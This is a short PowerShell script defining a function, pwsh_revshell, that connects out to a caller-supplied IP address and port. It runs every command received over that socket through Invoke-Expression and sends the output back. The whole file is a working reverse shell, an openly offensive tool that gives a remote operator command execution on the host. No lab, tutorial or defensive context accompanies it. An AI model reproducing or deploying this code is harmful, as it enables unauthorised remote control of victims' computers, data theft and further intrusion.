Function pwsh_revshell {
  Param (
    [Parameter(Mandatory=$true)]
    [ValidateNotNullOrEmpty()]
    [string]
    $ip
    ,
    [Parameter(Mandatory=$true)]
    [ValidateNotNullOrEmpty()]
    [int]
    $port
  )

$Address = [System.Net.IPAddress]::Parse($ip) 
$Socket = New-Object System.Net.Sockets.TCPClient($Address, $port) 
$stream = $Socket.GetStream() 
$Writer = New-Object System.IO.StreamWriter($stream)

$bytes = New-Object System.Byte[] 16384 #Supports commands up to 16384 bytes. If you need more space, increase this number

while (($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
  $EncodedText = New-Object System.Text.ASCIIEncoding
  $data = $EncodedText.GetString($bytes,0, $i)
  $out = Invoke-Expression($data) -ErrorVariable failure | out-string
  
  if ($failure.count -gt 0){
  $out = $out + "Error: " + $failure 
  }
  $out = $out.Trim()
  
  $out | % {
    $Writer.WriteLine($_)
    $Writer.Flush()
  } 
}  
$Stream.Close()
$Socket.Close()
}
